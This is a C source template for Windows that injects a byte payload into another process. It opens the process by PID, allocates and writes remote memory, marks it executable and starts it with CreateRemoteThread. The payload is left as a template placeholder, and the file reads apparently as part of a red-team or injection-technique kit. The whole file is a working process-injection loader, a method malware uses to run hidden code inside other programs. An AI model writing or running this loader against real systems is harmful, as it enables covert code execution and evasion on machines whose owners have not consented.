#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

static unsigned char payload[] = {
    {{PAYLOAD_BYTES_C}}
};

static const SIZE_T payload_len =
    (SIZE_T){{PAYLOAD_BYTES_LEN}};


static int get_process_arch(HANDLE process)
{
    BOOL wow64 = FALSE;
    SYSTEM_INFO si;

    ZeroMemory(&si, sizeof(si));
    GetNativeSystemInfo(&si);

    if (!IsWow64Process(process, &wow64))
    {
        return 0;
    }

    if (
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
        si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64
    )
    {
        return wow64 ? 32 : 64;
    }

    return 32;
}

int main(int argc, char **argv)
{
    DWORD pid;
    HANDLE process = NULL;
    HANDLE thread = NULL;
    LPVOID remote = NULL;
    SIZE_T written = 0;
    DWORD old_protect = 0;
    DWORD thread_id = 0;
    int target_arch = 0;
    int result = 0;
    LPVOID remote_report = NULL;

#ifdef _WIN64
    const int build_arch = 64;
#else
    const int build_arch = 32;
#endif

    if (argc != 2)
    {
        fprintf(
            stderr,
            "Usage: %s <pid>\n",
            argv[0]
        );

        return 1;
    }

    pid = (DWORD)strtoul(
        argv[1],
        NULL,
        10
    );

    if (pid == 0)
    {
        fprintf(
            stderr,
            "Invalid PID\n"
        );

        return 1;
    }

    process = OpenProcess(
        PROCESS_CREATE_THREAD |
        PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE,
        FALSE,
        pid
    );

    if (process == NULL)
    {
        fprintf(
            stderr,
            "OpenProcess failed: %lu\n",
            GetLastError()
        );

        return 1;
    }


    target_arch = get_process_arch(process);

    if (target_arch == 0)
    {
        fprintf(
            stderr,
            "Architecture detection failed: %lu\n",
            GetLastError()
        );

        CloseHandle(process);
        return 1;
    }

    printf(
        "[+] Build arch  : %s\n",
        build_arch == 64 ? "x64" : "x86"
    );

    printf(
        "[+] Target arch : %s\n",
        target_arch == 64 ? "x64" : "x86"
    );

    if (build_arch != target_arch)
    {
        fprintf(
            stderr,
            "Architecture mismatch\n"
        );

        CloseHandle(process);
        return 1;
    }

    remote = VirtualAllocEx(
        process,
        NULL,
        payload_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (remote == NULL)
    {
        fprintf(
            stderr,
            "VirtualAllocEx failed: %lu\n",
            GetLastError()
        );

        CloseHandle(process);
        return 1;
    }

    if (!WriteProcessMemory(
        process,
        remote,
        payload,
        payload_len,
        &written
    ))
    {
        fprintf(
            stderr,
            "WriteProcessMemory failed: %lu\n",
            GetLastError()
        );

        VirtualFreeEx(
            process,
            remote,
            0,
            MEM_RELEASE
        );

        CloseHandle(process);
        return 1;
    }

    if (written != payload_len)
    {
        fprintf(
            stderr,
            "Incomplete payload write\n"
        );

        VirtualFreeEx(
            process,
            remote,
            0,
            MEM_RELEASE
        );

        CloseHandle(process);
        return 1;
    }

    if (!VirtualProtectEx(
        process,
        remote,
        payload_len,
        PAGE_EXECUTE_READ,
        &old_protect
    ))
    {
        fprintf(
            stderr,
            "VirtualProtectEx failed: %lu\n",
            GetLastError()
        );

        VirtualFreeEx(
            process,
            remote,
            0,
            MEM_RELEASE
        );

        CloseHandle(process);
        return 1;
    }

    if (!FlushInstructionCache(
        process,
        remote,
        payload_len
    ))
    {
        fprintf(
            stderr,
            "FlushInstructionCache failed: %lu\n",
            GetLastError()
        );

        VirtualFreeEx(
            process,
            remote,
            0,
            MEM_RELEASE
        );

        CloseHandle(process);
        return 1;
    }

    thread = CreateRemoteThread(
        process,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remote,
        NULL,
        0,
        &thread_id
    );

    if (thread == NULL)
    {
        fprintf(
            stderr,
            "CreateRemoteThread failed: %lu\n",
            GetLastError()
        );

        VirtualFreeEx(
            process,
            remote,
            0,
            MEM_RELEASE
        );

        CloseHandle(process);
        return 1;
    }

    remote_report = remote;

    DWORD wait_status = WaitForSingleObject(
        thread,
        5000
    );

    if (wait_status == WAIT_OBJECT_0)
    {
        DWORD exit_code = 0;

        if (!GetExitCodeThread(
            thread,
            &exit_code
        ))
        {
            fprintf(
                stderr,
                "GetExitCodeThread failed: %lu\n",
                GetLastError()
            );
            result = 1;
        }
        else
        {
            printf(
                "[+] Thread exit : %lu\n",
                exit_code
            );
        }

        if (!VirtualFreeEx(
            process,
            remote,
            0,
            MEM_RELEASE
        ))
        {
            fprintf(
                stderr,
                "VirtualFreeEx failed: %lu\n",
                GetLastError()
            );
            result = 1;
        }

        remote = NULL;
    }
    else if (wait_status == WAIT_TIMEOUT)
    {
        printf(
            "[+] Thread state : still running "
            "after 5000 ms\n"
        );

        /*
         * A long-running thread is not a technique
         * failure. Keep the remote memory allocated
         * because the thread may still be using it.
         */
    }
    else if (wait_status == WAIT_FAILED)
    {
        fprintf(
            stderr,
            "WaitForSingleObject failed: %lu\n",
            GetLastError()
        );
        result = 1;
    }
    else
    {
        fprintf(
            stderr,
            "Unexpected wait status: 0x%08lX\n",
            (unsigned long)wait_status
        );
        result = 1;
    }

    printf(
        "[+] PID        : %lu\n",
        pid
    );

    printf(
        "[+] Remote     : %p\n",
        remote_report
    );

    printf(
        "[+] Thread ID  : %lu\n",
        thread_id
    );

    printf(
        "[+] Payload    : %llu bytes\n",
        (unsigned long long)payload_len
    );

    CloseHandle(thread);
    CloseHandle(process);

    return result;
}
